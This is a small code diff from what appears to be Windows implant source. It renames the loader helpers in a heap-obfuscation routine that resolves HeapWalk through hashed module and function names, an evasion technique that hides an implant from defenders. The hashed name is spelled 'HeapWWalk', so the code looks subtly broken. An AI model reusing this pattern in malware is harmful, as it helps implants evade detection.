@@ -37,7 +37,7 @@ FUNC VOID HeapObf(
     MmZero( &HeapEntry, sizeof( PROCESS_HEAP_ENTRY ) );
 
     typedef WINBOOL (*fHeapWalk)(HANDLE hHeap, LPPROCESS_HEAP_ENTRY lpEntry);
-    fHeapWalk pHeapWalk = LdrFuncAddr( LdrModuleAddr( HASH_STR( "KERNEL32.DLL" ) ), HASH_STR( "HeapWWalk" ) );
+    fHeapWalk pHeapWalk = LdrLoadFunc( LdrLoadModule( HASH_STR( "KERNEL32.DLL" ) ), HASH_STR( "HeapWWalk" ) );
 
     pHeapWalk( Heap, &HeapEntry );
     if ( HeapEntry.wFlags & PROCESS_HEAP_ENTRY_BUSY ) {
